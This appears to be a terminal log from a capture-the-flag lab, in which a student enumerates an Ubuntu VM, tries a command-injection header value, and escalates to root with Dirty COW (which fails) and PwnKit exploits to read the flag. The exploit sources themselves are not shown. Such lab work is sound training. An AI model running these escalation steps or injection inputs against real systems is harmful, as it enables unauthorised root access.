@@ -1,0 +1,275 @@
+student@saic-VirtualBox:~$ whoami
+student
+student@saic-VirtualBox:~$ pwd
+/home/student
+student@saic-VirtualBox:~$ ls
+Desktop  Documents  Downloads  examples.desktop  Music  Pictures  Public  Templates  Videos
+student@saic-VirtualBox:~$ uname -a
+Linux saic-VirtualBox 4.4.0-148-generic #174~14.04.1-Ubuntu SMP Thu May 9 08:17:37 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
+student@saic-VirtualBox:~$ sudo -l
+[sudo] password for student: 
+Sorry, user student may not run sudo on saic-VirtualBox.
+student@saic-VirtualBox:~$ sudo -1
+sudo: invalid option -- '1'
+usage: sudo -h | -K | -k | -V
+usage: sudo -v [-AknS] [-g group] [-h host] [-p prompt] [-u user]
+usage: sudo -l [-AknS] [-g group] [-h host] [-p prompt] [-U user] [-u user] [command]
+usage: sudo [-AbEHknPS] [-r role] [-t type] [-C num] [-g group] [-h host] [-p prompt] [-u user] [VAR=value]
+            [-i|-s] [<command>]
+usage: sudo -e [-AknS] [-r role] [-t type] [-C num] [-g group] [-h host] [-p prompt] [-u user] file ...
+student@saic-VirtualBox:~$ ip a
+1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1
+    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
+    inet 127.0.0.1/8 scope host lo
+       valid_lft forever preferred_lft forever
+    inet6 ::1/128 scope host 
+       valid_lft forever preferred_lft forever
+2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UP group default qlen 1000
+    link/ether 08:00:27:fd:d2:9a brd ff:ff:ff:ff:ff:ff
+    inet 10.0.2.15/24 brd 10.0.2.255 scope global eth0
+       valid_lft forever preferred_lft forever
+    inet6 fd17:625c:f037:2:fcd6:8628:241d:95c2/64 scope global temporary dynamic 
+       valid_lft 86397sec preferred_lft 14397sec
+    inet6 fd17:625c:f037:2:a00:27ff:fefd:d29a/64 scope global dynamic 
+       valid_lft 86397sec preferred_lft 14397sec
+    inet6 fe80::a00:27ff:fefd:d29a/64 scope link 
+       valid_lft forever preferred_lft forever
+student@saic-VirtualBox:~$ ps aux | head
+USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
+root         1  0.2  0.2  33928  4512 ?        Ss   01:20   0:01 /sbin/init
+root         2  0.0  0.0      0     0 ?        S    01:20   0:00 [kthreadd]
+root         3  0.0  0.0      0     0 ?        S    01:20   0:00 [ksoftirqd/0]
+root         5  0.0  0.0      0     0 ?        S<   01:20   0:00 [kworker/0:0H]
+root         6  0.1  0.0      0     0 ?        S    01:20   0:00 [kworker/u4:0]
+root         7  0.0  0.0      0     0 ?        S    01:20   0:00 [rcu_sched]
+root         8  0.0  0.0      0     0 ?        S    01:20   0:00 [rcu_bh]
+root         9  0.0  0.0      0     0 ?        S    01:20   0:00 [migration/0]
+root        10  0.0  0.0      0     0 ?        S    01:20   0:00 [watchdog/0]
+student@saic-VirtualBox:~$ netstat -tulip
+Kernel Interface table
+Iface   MTU Met   RX-OK RX-ERR RX-DRP RX-OVR    TX-OK TX-ERR TX-DRP TX-OVR Flg
+eth0       1500 0      6541      0      0 0          1492      0      0      0 BMRU
+lo        65536 0       535      0      0 0           535      0      0      0 LRU
+student@saic-VirtualBox:~$ ss -lntp
+State       Recv-Q Send-Q                                       Local Address:Port                                         Peer Address:Port 
+LISTEN      0      5                                                127.0.0.1:5000                                                    *:*     
+LISTEN      0      5                                                127.0.0.1:9000                                                    *:*     
+LISTEN      0      128                                                      *:80                                                      *:*     
+LISTEN      0      5                                                127.0.1.1:53                                                      *:*     
+LISTEN      0      128                                                      *:22                                                      *:*     
+LISTEN      0      128                                              127.0.0.1:631                                                     *:*     
+LISTEN      0      128                                                     :::22                                                     :::*     
+LISTEN      0      128                                                    ::1:631                                                    :::*     
+student@saic-VirtualBox:~$ ls /var/www/html
+ls: cannot access /var/www/html: No such file or directory
+student@saic-VirtualBox:~$ /etc/nginx/nginx.conf
+bash: /etc/nginx/nginx.conf: Permission denied
+student@saic-VirtualBox:~$ /etc/nginx/sites-enabled/
+bash: /etc/nginx/sites-enabled/: Is a directory
+student@saic-VirtualBox:~$ /etc/nginx/sites-enabled
+bash: /etc/nginx/sites-enabled: Is a directory
+student@saic-VirtualBox:~$ cat /etc/nginx/nginx.conf
+user www-data;
+worker_processes 4;
+pid /run/nginx.pid;
+
+events {
+	worker_connections 768;
+	# multi_accept on;
+}
+
+http {
+
+	##
+	# Basic Settings
+	##
+
+	sendfile on;
+	tcp_nopush on;
+	tcp_nodelay on;
+	keepalive_timeout 65;
+	types_hash_max_size 2048;
+	# server_tokens off;
+
+	# server_names_hash_bucket_size 64;
+	# server_name_in_redirect off;
+
+	include /etc/nginx/mime.types;
+	default_type application/octet-stream;
+
+	##
+	# Logging Settings
+	##
+
+	access_log /var/log/nginx/access.log;
+	error_log /var/log/nginx/error.log;
+
+	##
+	# Gzip Settings
+	##
+
+	gzip on;
+	gzip_disable "msie6";
+
+	# gzip_vary on;
+	# gzip_proxied any;
+	# gzip_comp_level 6;
+	# gzip_buffers 16 8k;
+	# gzip_http_version 1.1;
+	# gzip_types text/plain text/css application/json application/x-javascript text/xml application/xml application/xml+rss text/javascript;
+
+	##
+	# nginx-naxsi config
+	##
+	# Uncomment it if you installed nginx-naxsi
+	##
+
+	#include /etc/nginx/naxsi_core.rules;
+
+	##
+	# nginx-passenger config
+	##
+	# Uncomment it if you installed nginx-passenger
+	##
+	
+	#passenger_root /usr;
+	#passenger_ruby /usr/bin/ruby;
+
+	##
+	# Virtual Host Configs
+	##
+
+	include /etc/nginx/conf.d/*.conf;
+	include /etc/nginx/sites-enabled/*;
+}
+
+
+#mail {
+#	# See sample authentication script at:
+#	# http://wiki.nginx.org/ImapAuthenticateWithApachePhpScript
+# 
+#	# auth_http localhost/auth.php;
+#	# pop3_capabilities "TOP" "USER";
+#	# imap_capabilities "IMAP4rev1" "UIDPLUS";
+# 
+#	server {
+#		listen     localhost:110;
+#		protocol   pop3;
+#		proxy      on;
+#	}
+# 
+#	server {
+#		listen     localhost:143;
+#		protocol   imap;
+#		proxy      on;
+#	}
+#}
+student@saic-VirtualBox:~$ ls /etc/nginx/sites-enabled
+helios
+student@saic-VirtualBox:~$ cat /etc/nginx/sites-enabled/*
+server {
+    listen 80;
+
+    location / {
+        proxy_pass http://127.0.0.1:5000;
+        proxy_set_header X-Forwarded-For $http_x_forwarded_for;
+    }
+}
+
+student@saic-VirtualBox:~$ curl -H "X-Forwarded-For: 127.0.0.1" http://localhost
+Helios Internal Dashboardstudent@saic-VirtualBox:~$ curl -H "X-Forwarded-For: 127.0.0.1" http://localhost/admin
+student@saic-VirtualBox:~$ curl -H "X-Forwarded-For: 127.0.0.1" http://localhost/debug
+student@saic-VirtualBox:~$ curl -H "X-Forwarded-For: 127.0.0.1" http://localhost/status
+student@saic-VirtualBox:~$ curl -i http://127.0.0.1:5000
+HTTP/1.0 200 OK
+Server: BaseHTTP/0.3 Python/2.7.6
+Date: Sat, 17 Jan 2026 20:45:55 GMT
+
+Helios Internal Dashboardstudent@saic-VirtualBox:~$ curl -i http://127.0.0.1:5000/
+HTTP/1.0 200 OK
+Server: BaseHTTP/0.3 Python/2.7.6
+Date: Sat, 17 Jan 2026 20:46:08 GMT
+
+Helios Internal Dashboardstudent@saic-VirtualBox:~$ 
+student@saic-VirtualBox:~$ curl -i http://127.0.0.1:9000
+HTTP/1.0 501 Unsupported method ('GET')
+Server: BaseHTTP/0.3 Python/2.7.6
+Date: Sat, 17 Jan 2026 20:50:21 GMT
+Content-Type: text/html
+Connection: close
+
+<head>
+<title>Error response</title>
+</head>
+<body>
+<h1>Error response</h1>
+<p>Error code 501.
+<p>Message: Unsupported method ('GET').
+<p>Error code explanation: 501 = Server does not support this operation.
+</body>
+student@saic-VirtualBox:~$ nc 127.0.0.1 9000
+
+student@saic-VirtualBox:~$ ^C
+student@saic-VirtualBox:~$ sudo -l
+[sudo] password for student: 
+Sorry, user student may not run sudo on saic-VirtualBox.
+student@saic-VirtualBox:~$ find / -perm -u=s -type f 2>/dev/null
+/usr/sbin/pppd
+/usr/sbin/uuidd
+/usr/lib/eject/dmcrypt-get-device
+/usr/lib/policykit-1/polkit-agent-helper-1
+/usr/lib/openssh/ssh-keysign
+/usr/lib/x86_64-linux-gnu/oxide-qt/chrome-sandbox
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/bin/sudo
+/usr/bin/chsh
+/usr/bin/traceroute6.iputils
+/usr/bin/mtr
+/usr/bin/newgrp
+/usr/bin/lppasswd
+/usr/bin/pkexec
+/usr/bin/gpasswd
+/usr/bin/passwd
+/usr/bin/chfn
+/opt/VBoxGuestAdditions-7.1.6/bin/VBoxDRMClient
+/bin/ping6
+/bin/su
+/bin/ping
+/bin/mount
+/bin/fusermount
+/bin/umount
+student@saic-VirtualBox:~$ curl -H "X-Forwarded-For: 127.0.0.1; whoami" http://127.0.0.1:80
+Helios Internal Dashboardstudent@saic-VirtualBox:~$ nano dirty.c
+student@saic-VirtualBox:~$ gcc -pthread dirty.c -o dirty -lcrypt
+student@saic-VirtualBox:~$ ./dirty mypass
+su firefart
+^C
+student@saic-VirtualBox:~$ ./dirty mypass
+^C
+student@saic-VirtualBox:~$ grep firefart /etc/passwd
+student@saic-VirtualBox:~$ nano pwnkit.c
+student@saic-VirtualBox:~$ gcc pwnkit.c -o pwnkit
+student@saic-VirtualBox:~$ ./pwnkit
+mkdir: cannot create directory ‘pwnkit’: File exists
+sh: 1: cannot create pwnkit/gconv-modules: Directory nonexistent
+/usr/bin/ld: cannot open output file pwnkit/pwnkit.so: Not a directory
+collect2: error: ld returned 1 exit status
+GLib: Cannot convert message: Could not open converter from 'UTF-8' to 'PWNKIT'
+The value for the SHELL variable was not found the /etc/shells file
+
+This incident has been reported.
+student@saic-VirtualBox:~$ nano pwnkit.c
+student@saic-VirtualBox:~$ pwnkit
+pwnkit: command not found
+student@saic-VirtualBox:~$ rm -rf pwnkit lib.c
+student@saic-VirtualBox:~$ gcc pwnkit.c -o exploit
+student@saic-VirtualBox:~$ ./exploit
+# cat /root/flag.txt
+/bin/sh: 1: cat: not found
+# whoami
+/bin/sh: 2: whoami: not found
+# /usr/bin/whoami
+root
+# /bin/cat /root/flag.txt
+SAIC{C0ngr4ts_d0_y0u_l0v3_ST4C?}
+# 
